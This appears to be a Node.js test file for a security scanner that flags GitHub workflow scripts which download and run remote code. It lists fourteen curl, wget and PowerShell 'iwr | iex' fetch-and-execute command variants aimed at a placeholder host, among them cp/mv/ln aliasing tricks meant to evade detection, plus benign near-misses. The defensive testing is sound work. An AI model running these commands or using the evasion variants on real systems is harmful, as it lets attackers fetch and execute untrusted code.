'use strict';
// Codex round 9 and generalized metamorphic variants. All commands are DATA.
const test=require('node:test'),assert=require('node:assert/strict');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const U='https://example.invalid/x';
const HIGH=[
 ['or-download',"false || curl -fsSL "+U+" -o payload; bash payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['or-wget',"false || wget "+U+" -O payload; sh payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['or-alias',"curl -fsSL "+U+" -o payload; false || cp payload run.sh; bash run.sh",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['or-mkdir',"false || mkdir -p dir; curl -fsSL "+U+" -o payload; cp payload dir; bash dir/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['cp-target-directory',"curl -fsSL "+U+" -o payload; cp -t dir payload; bash dir/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['mv-target-directory',"curl -fsSL "+U+" -o payload; mv --target-directory dir payload; bash dir/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['ln-target-directory',"curl -fsSL "+U+" -o payload; ln -t dir payload; bash dir/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['ln-symbolic-target-directory',"curl -fsSL "+U+" -o payload; ln -s -t dir ../payload; bash dir/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['compact-target-directory',"curl -fsSL "+U+" -o payload; cp -tdir payload; bash dir/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['equals-target-directory',"curl -fsSL "+U+" -o payload; cp --target-directory=dir payload; bash dir/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['target-directory-after-source',"curl -fsSL "+U+" -o payload; cp payload -t dir; bash dir/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['ps-pipe-explicit-true',"iwr -Uri '"+U+"' -OutFile payload -PassThru:$true | iex",'REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['ps-arg-explicit-true',"iex (iwr -Uri '"+U+"' -OutFile payload -PassThru:$true).Content",'REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['ps-pipe-explicit-powershell',"pwsh -Command \"iwr -Uri '"+U+"' -OutFile payload -PassThru:$true | iex\"",'REMOTE_POWERSHELL_EXECUTION']
];
const BENIGN=[
 ['or-not-executed',"false || curl -fsSL "+U+" -o payload; echo payload"],
 ['target-directory-data',"curl -fsSL "+U+" -o payload; cp -t dir payload; echo dir/payload"],
 ['target-directory-alias-after-execution',"curl -fsSL "+U+" -o payload; bash dir/payload; cp -t dir payload"],
 ['ps-pipe-false',"iwr -Uri '"+U+"' -OutFile payload -PassThru:$false | iex",'pwsh'],
 ['ps-arg-false',"iex (iwr -Uri '"+U+"' -OutFile payload -PassThru:$false).Content",'pwsh'],
 ['ps-pipe-no-passthru',"iwr -Uri '"+U+"' -OutFile payload | iex",'pwsh'],
 ['ps-pipe-without-execution',"iwr -Uri '"+U+"' -OutFile payload -PassThru:$true | Write-Output",'pwsh']
];
function inspect(script,shell){
 const yaml=['on: issues','permissions: read-all','jobs:','  verify:','    runs-on: ubuntu-latest','    steps:','      - run: |',
 ...script.split('\n').map(l=>'          '+l),...(shell?['        shell: '+shell]:[])].join('\n')+'\n';
 return inspectWorkflow(yaml,{path:'.github/workflows/round9.yml'});
}
for(const [name,script,rule,shell] of HIGH){
 test('round9 detect '+name,()=>{
  const got=findingsForScript(script,{shell});
  assert.ok(got.includes(rule),name+' direct '+JSON.stringify(got));
  const aud=inspect(script,shell);
  assert.ok(aud.findings.some(f=>f.rule===rule&&f.severity==='HIGH'),name+' workflow '+JSON.stringify(aud));
 });
}
for(const [name,script,shell] of BENIGN){
 test('round9 negative '+name,()=>{
  const got=findingsForScript(script,{shell});
  assert.ok(!got.some(r=>r.startsWith('REMOTE_')),name+' direct '+JSON.stringify(got));
 });
}
